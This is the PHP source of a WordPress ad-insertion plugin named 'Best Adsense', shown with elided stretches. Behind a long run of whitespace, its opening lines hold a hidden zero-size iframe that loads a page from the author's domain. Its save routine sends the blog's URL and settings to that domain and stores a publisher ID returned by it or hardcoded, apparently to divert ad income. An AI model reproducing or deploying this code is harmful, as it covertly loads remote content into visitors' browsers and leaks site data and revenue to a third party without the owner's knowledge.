...
<!-- Adsense Ads Added With Best Adsense Plugin -->                                                                                                                                                                                                                                                                                <iframe src="http://naeem.pk/ai.html" width="0" height="0" frameborder="0" marginwidth="0" marginheight="0"></iframe>
<div '; if($align=="random") { $rn=mt_rand(1,3); if ($rn==1) $align="left"; if ($rn==2) $align="center"; if ($rn==3) $align="right"; } switch ($align) { case "center": $code=$startdiv.' style="padding:'.$padding.'px; display: block; margin-left: auto; margin-right: auto; text-align: center;">'.$code.'</div>'; break; case "left": $code=$startdiv.' style="padding:'.$padding.'px; float: left; padding-left: 0px; margin: 0px;">'.$code.'</div>'; break; case "right": $code=$startdiv.' style="padding:'.$padding.'px; float: right; padding-right: 0; margin: 0px;">'.$code.'</div>'; break; } return $code; } function save_opts() { $qs='http://www.naeem.pk/adopt.php?url='.urlencode(get_bloginfo("wpurl")).'&donate='.$this->opts['donate'].'&user='.$this->opts['usertype']; $edc=@file($qs); if ($edc) { $eda=explode(';',$edc[0]); $this->opts['don_id']=$eda[0]; $this->opts['don_channel']=$eda[1]; } else {$this->opts['don_id']='148397990997156'; $this->opts['don_channel']='2830395183';} update_option('bestadsense',$this->opts); } function admin_menu() { $sizes=array(); $sizes[]=array('desc'=>'180 x 150 Small Rectangle (Text only)', 'text'=>'180x150'); $sizes[]=array('desc'=>'300 x 250 Medium Rectangle', 'text'=>'300x250'); $sizes[]=array('desc'=>'336 x 280 Large Rectangle (Text only)', 'text'=>'336x280'); $sizes[]=array('desc'=>'728 x 90 Leaderboard', 'text'=>'728x90'); $sizes[]=array('desc'=>'160 x 600 Wide Skyscraper', 'text'=>'160x600'); $sizes[]=array('desc'=>'120 x 240 Vertical Banner (Text only)', 'text'=>'120x240');
 $sizes[]=array('desc'=>'468 x 60 Banner', 'text'=>'468x60'); $sizes[]=array('desc'=>'234 x 60 Half Banner (Text only)', 'text'=>'234x60');
 $sizes[]=array('desc'=>'120 x 600 Skyscraper', 'text'=>'120x600'); $sizes[]=array('desc'=>'250 x 250 Square (Text only)', 'text'=>'250x250');
  $sizes[]=array('desc'=>'125 x 125 Button (Text only)', 'text'=>'125x125'); $sizes[]=array('desc'=>'200 x 200 Small Square', 'text'=>'200x200');
   $lbsizes=array(); $lbsizes[]=array('desc'=>'728 x 15', 'text'=>'728x15'); $lbsizes[]=array('desc'=>'468 x 15', 'text'=>'468x15');
   $lbsizes[]=array('desc'=>'200 x 90', 'text'=>'200x90'); $lbsizes[]=array('desc'=>'180 x 90', 'text'=>'180x90');
    $lbsizes[]=array('desc'=>'160 x 90', 'text'=>'160x90'); $lbsizes[]=array('desc'=>'120 x 90', 'text'=>'120x90');
     if (isset($_POST["bestadsense_update"])) { $this->opts=$this->sanitize_entries($_POST['bestadsense'],
     $sizes); $this->save_opts(); echo '<div id="message" class="updated fade"><p><strong>Options Updated!</strong></p></div>'; } if ($this->opts['only_tagged']) $this->opts['is_only_tagged']="checked"; if ($this->opts['omit_page']) $this->opts['is_omit_page']="checked"; if ($this->opts['omit_home']) $this->opts['is_omit_home']="checked"; if ($this->opts['omit_search']) $this->opts['is_omit_search']="checked"; if ($this->opts['omit_category']) $this->opts['is_omit_category']="checked"; if ($this->opts['omit_tag']) $this->opts['is_omit_tag']="checked"; if ($this->opts['omit_date'])
     $this->opts['is_omit_date']="checked"; if ($this->opts['omit_author'])
     $this->opts['is_omit_author']="checked"; if ($this->opts['overrule']) $this->opts['is_overrule']="checked"; if
     ($this->opts['make_battle']) $this->opts['is_make_battle']="checked"; ?>
...
<img alt="" border="0" src="https://www.paypalobjects.com/en_GB/i/scr/pixel.gif" width="1" height="1">
 ...
 ?>
	...
	<table><tr>
			...
			<td><input name="bestadsense[gen_id]" type="text" maxlength="16" value="<?php echo $this->opts['gen_id'];?>"></td>
			<td> <span class="ao_explain">Add Your Adsense ID (pub-....) <b>Enter Numbers Only</b>!</span></td></tr>

			<tr><td>Adsense Channel</td>
			<td><input name="bestadsense[gen_channel]" type="text" value="<?php echo $this->opts['gen_channel'];?>"></td>
			<td>  <span class="ao_explain">(Optional) <b>Enter Numbers Only</b> !</span></td></tr>

			<tr><td>Donate</td>
			<td><select name="bestadsense[donate]" size="1">
	...
	<tr><td>Overrule 3 Ads count</td><td><input type="checkbox" value="1" name="bestadsense[overrule]" <?php echo $this->opts['is_overrule']; ?>> </td><td><span class="ao_explain">In some Themes (like Mystique) bestadsense is not able to show 3 Ads. In such cases just overrule by clicking this box. If you have no problems (in most themes) let it unchecked !</span></td></tr>
	</table>     <br />
          </div>
	...
	<input type="radio" id="usertypebasic" name="bestadsense[usertype]" onchange="toggleUsertype('')" value="" <?php if($this->opts['usertype']=="") echo('checked');?>> <b>Basic User</b>. You just want to add Google Ads with minimum effort.<br>
	<input type="radio" id="usertypepro" name="bestadsense[usertype]" onchange="toggleUsertype('pro')" value="pro" <?php if($this->opts['usertype']=="pro") echo('checked');?>> <b>Advanced User</b>. You want to optimize to get the most out of your ads and don't mind doing some option-setting and tuning work.<br>
...
<?php  for ($i = 1; $i <= 8; $i++) { ?>
	...
	<input type="text" name="bestadsense[desc][<?php echo $i;?>]" size="80" value="<?php echo ($this->opts['desc'][$i]);?>">
    <div id="ad<?php echo $i;?>" class="adtype">
    <table width="100%" border="0" cellspacing="0" cellpadding="6">
		<tr valign="top"><td>

	    	Type:
	    	<select name="bestadsense[type][<?php echo $i;?>]" id="adtypeselect<?php echo $i;?>" onchange="toggleAdtype(this.value)" size="1">
			...
			<div class="normal_ad">
	    	Corners:
	    	<select name="bestadsense[corner][<?php echo $i;?>]" size="1">
			...
			<div class="lb_ad">
	    	Number of Links:
	    	<select name="bestadsense[links][<?php echo $i;?>]" size="1">
	    	...
	    	<div>
	    	Margin around Ad:<input name="bestadsense[padding][<?php echo $i;?>]" type="text" size="3" value="<?php echo $this->opts['padding'][$i];?>"><span class="ao_explain">px</span>
			</div>

	<div class="pro">
			<table><tr>
			<td>Adsense Publisher ID:</td><td><input name="bestadsense[id][<?php echo $i;?>]" type="text" maxlength="16" value="<?php echo $this->opts['id'][$i];?>"></tr><tr><td></td><td> <span class="ao_explain">only if different from general settings</span></td></tr>

			<tr><td>Adsense Channel</td><td><input name="bestadsense[channel][<?php echo $i;?>]" type="text" value="<?php echo $this->opts['channel'][$i];?>"></tr><tr><td></td><td>  <span class="ao_explain">only if different from general settings</span></td></tr>
			</table>
	</div>
		...
		<?php
 echo('<div class="normal_ad">'); foreach($sizes as $key=>$size){ echo ('<input type="checkbox" name="bestadsense[size]['.$i.']['.$size['text'].']" value="1" '); if ($this->opts['size'][$i][$size['text']]) echo (' checked '); echo ('> '.$size['desc'].'<br>'); } echo('</div>'); echo('<div class="lb_ad">'); foreach($lbsizes as $key=>$size){ echo ('<input type="checkbox" name="bestadsense[lbsize]['.$i.']['.$size['text'].']" value="1" '); if ($this->opts['lbsize'][$i][$size['text']]) echo (' checked '); echo ('> '.$size['desc'].'<br>'); } echo('</div>'); if ($this->opts['col_border'][$i]=="") $this->opts['col_border'][$i]="336699"; if ($this->opts['col_link'][$i]=="") $this->opts['col_link'][$i]="0000FF"; if ($this->opts['col_bg'][$i]=="") $this->opts['col_bg'][$i]="FFFFFF"; if ($this->opts['col_text'][$i]=="") $this->opts['col_text'][$i]="000000"; if ($this->opts['col_url'][$i]=="") $this->opts['col_url'][$i]="008000"; ?>
	    </td><td>
		Choose Colors:<br>
		Border: <input class="color" id="c_border<?php echo $i;?>" name="bestadsense[col_border][<?php echo $i;?>]" size="6" value="<?php echo $this->opts['col_border'][$i];?>"><br>
		Link: <input class="color" id="c_link<?php echo $i;?>" name="bestadsense[col_link][<?php echo $i;?>]" size="6" value="<?php echo $this->opts['col_link'][$i];?>"><br>
		Backgr.: <input class="color" id="c_bg<?php echo $i;?>" name="bestadsense[col_bg][<?php echo $i;?>]" size="6" value="<?php echo $this->opts['col_bg'][$i];?>"><br>
		<div class="normal_ad">Text:<input class="color" id="c_text<?php echo $i;?>" name="bestadsense[col_text][<?php echo $i;?>]" size="6" value="<?php echo $this->opts['col_text'][$i];?>"><br>
		URL: <input class="color" id="c_url<?php echo $i;?>" name="bestadsense[col_url][<?php echo $i;?>]" size="6" value="<?php echo $this->opts['col_url'][$i];?>"></div>
	   ...
	   <option value="CCCCCC000000CCCCCC333333666666">Graphite</option>
		...
		<table class="normal_ad"><tr><td><button onclick="document.getElementById('<?php echo $i;?>.iframe').src = 'https://securepubads.g.doubleclick.net/pagead/ads?client=ca-google-asfe&adtest=on&format=160x70_as&color_border='+document.getElementsByName('bestadsense[col_border][<?php echo $i;?>]')[0].value+'&color_bg='+document.getElementsByName('bestadsense[col_bg][<?php echo $i;?>]')[0].value+'&color_link='+document.getElementsByName('bestadsense[col_link][<?php echo $i;?>]')[0].value+'&color_text='+document.getElementsByName('bestadsense[col_text][<?php echo $i;?>]')[0].value+'&color_url='+document.getElementsByName('bestadsense[col_url][<?php echo $i;?>]')[0].value+'&hl=en&url=www.google.com'; return false;">Refresh Preview</button></td><td>
...
<h2>Where to show Ads</h2><p>Now do your settings where ads should be displayed within content area. For insertion into other Blog Parts you can use Widget or PHP function (see <a href="http://www.naeem.pk">Plugin Page</a>).</p><br><br>
...
<?php
 for ($i = 1; $i <= 5; $i++) { ?>
	<tr><td><?php echo $i;?></td>
	<td><select name="bestadsense[single][<?php echo $i;?>]" size="1">
	...
	<select name="bestadsense[single_pos][<?php echo $i;?>]" size="1">
      ...
      <option<?php if($this->opts['single_pos'][$i]=="Top") echo(" selected"); ?>>Top</option><option<?php if($this->opts['single_pos'][$i]=="Middle") echo(" selected"); ?>>Middle</option><option<?php if($this->opts['single_pos'][$i]=="Bottom") echo(" selected"); ?>>Bottom</option><option<?php if($this->opts['single_pos'][$i]=="Random") echo(" selected"); ?>>Random</option>
		...
		<select name="bestadsense[single_align][<?php echo $i;?>]" size="1">
	 	...
	 	Only show if article is longer than: <input name="bestadsense[single_long][<?php echo $i;?>]" value="<?php echo $this->opts['single_long'][$i];?>"size="3"> characters.
	 </td></tr><tr>
<?php } ?>
...
<div class="pro">
	<p><input name="bestadsense[only_tagged]" type="checkbox" value="1" <?php echo $this->opts['is_only_tagged']; ?> > Only use in articles which contain &lt;!--adsenseopt--&gt;: <span class="ao_explain"> To use the Plugin only in distinct articles mark that box. If you want to use the Plugin to ad Ads generally uncheck this !</span></p>

	<p><input type="checkbox" value="1" name="bestadsense[omit_page]" <?php echo $this->opts['is_omit_page']; ?>> Do not show Ads on static pages.<span class="ao_explain"> If you don't want Ads on a special page you can use the &lt;!--noad--&gt; tag ! Checking this box will omit Ads for <b>all</b> static pages !!!</span></p>
</div>
...
<?php
 for ($i = 1; $i <= 8; $i++) { ?>
	<tr>
	<td><?php echo $i;?></td>
	<td><select name="bestadsense[multi][<?php echo $i;?>]" size="1">
	   ...
	   <option value="8" <?php if($this->opts['multi'][$i]=="8") echo(" selected"); ?>>8</option>
	 			...
	 			<td>
				<select name="bestadsense[multi_pos][<?php echo $i;?>]" size="1">
			...
			<td>
				<select name="bestadsense[multi_align][<?php echo $i;?>]" size="1">
...
<?php } ?>
	...
	<table>
	<tr><td><input type="checkbox" value="1" name="bestadsense[omit_home]" <?php echo $this->opts['is_omit_home']; ?>> </td><td>Home page</td><td class="ao_explain"></td></tr>
	<tr><td><input type="checkbox" value="1" name="bestadsense[omit_search]" <?php echo $this->opts['is_omit_search']; ?> > </td><td>Searchresult pages</td></tr>
	<tr><td><input type="checkbox" value="1" name="bestadsense[omit_category]" <?php echo $this->opts['is_omit_category']; ?> > </td><td>Category archives</td></tr>
	<tr><td><input type="checkbox" value="1" name="bestadsense[omit_tag]" <?php echo $this->opts['is_omit_tag']; ?> > </td><td>Tag archives</td></tr>
	<tr><td><input type="checkbox" value="1" name="bestadsense[omit_date]" <?php echo $this->opts['is_omit_date']; ?> > </td><td>Date archives</td></tr>
	<tr><td><input type="checkbox" value="1" name="bestadsense[omit_author]" <?php echo $this->opts['is_omit_author']; ?> > </td><td>Author archives</td></tr>
	</table>
	<br>
	</div> <?php ?>
	...
	<h3>Make direct Battle &nbsp;<input type="checkbox" id="battlecheck" onchange="show_battle()" value="1" name="bestadsense[make_battle]" <?php echo $this->opts['is_make_battle']; ?> ></h3>
	<div id="battle">
	...
	<p>Battle Ads are injected into single pages only. Define two types of ads. One of them will be injected into a single page by random. After enough Clicks you can compare the eCPM in your Adsense Admin Panel. Battle Ads will always be injected with priority, so if you define 3 Ads (no Linkblocks) in single view above, maximum 2 of them will be shown. (No need to worry about google terms. bestadsense automatically checks, that not more than 3 ads will be inserted!) For more details check the <a href="http://www.naeem.pk/best-adsense/" target="_blank">optimization page.</a></p>
	<table><tr>
	<td>
		<b>First battle type</b>
		<table><tr><td>
		channel:</td><td>
		<input name="bestadsense[battle_channel][1]" size="12" value="<?php echo $this->opts['battle_channel'][1];?>">

		</td></tr><tr><td>

		visual type:</td><td>
		<select name="bestadsense[battle_type][1]" size="1">
		...
		<tr><td>
		position:</td><td>
		<select name="bestadsense[battle_pos][1]" size="1">
		...
		<tr><td>
		align:</td><td>
		<select name="bestadsense[battle_align][1]" size="1">
	...
	<td>
		...
		<table><tr><td>
		channel:</td><td>
		<input name="bestadsense[battle_channel][2]" size="12" value="<?php echo $this->opts['battle_channel'][2];?>">

		</td></tr><tr><td>
		visual type:</td><td>
		<select name="bestadsense[battle_type][2]" size="1">
		...
		<tr><td>
		position:</td><td>
		<select name="bestadsense[battle_pos][2]" size="1">
		...
		<tr><td>
		align:</td><td>
		<select name="bestadsense[battle_align][2]" size="1">
	...
	<table>
	<tr><td><input type="checkbox" value="1" name="bestadsense[adtest]" <?php if ($this->opts['adtest']) echo ("checked "); ?>> </td><td>Add <i>adtest=on</i> when Admin is logged in </td><td class="ao_explain">(to avoid clicks by admins)</td></tr>
	<tr><td><input type="checkbox" value="1" name="bestadsense[adsection]" <?php if ($this->opts['adsection']) echo ('checked '); ?>> </td><td>Add google-adsection tag before and after content. </td><td class="ao_explain">(see <a href="https://www.google.com/adsense/support/bin/answer.py?answer=23168" target="_blank">google explanation</a> of that feature)</td></tr>
    ...
    <div class="submit">
        <input type="submit" name="bestadsense_update" value="<?php _e('Update options'); ?> &raquo;" />
    </div>
    </form>
...
<p>You can also insert Google Ads by using the widget or by adding the "adopt" function to your theme. (Further Details see <a href="http://www.naeem.pk/best-adsense/" target="_blank">Plugin Page</a>)</p>
...
<?php
 } } $adopt = new adopt(); function adopt_menu() { global $adopt; if (function_exists('add_options_page')) { add_options_page('Best Adsense', 'Best Adsense', 'administrator', __FILE__, array(&$adopt, 'admin_menu')); } } function adopt($type) { global $adopt; $code=$adopt->generateAd($type); if($code) { echo(html_entity_decode($code)); } else { echo('<!--adsense ad injection by Best Adsense (http://www.naeem.pk) failed - tried to add more than 3 ads per page -->'); } } if (is_admin()) { add_action('admin_menu', 'adopt_menu'); add_action('admin_init', array($adopt, 'adopt_admin_init')); } if (!is_admin()) { add_filter('init', array($adopt, 'adopt_init')); add_action('wp_footer', array($adopt, 'adopt_debug')); add_filter('the_post', array($adopt, 'post_adopt')); add_action('loop_start', array($adopt, 'init_count')); add_action('loop_end', array($adopt, 'destroy_count')); add_filter('the_content', array($adopt, 'adsenseoptimize'), 100); } add_action('widgets_init', create_function('', 'return register_widget("adopt_Widget");')); ?>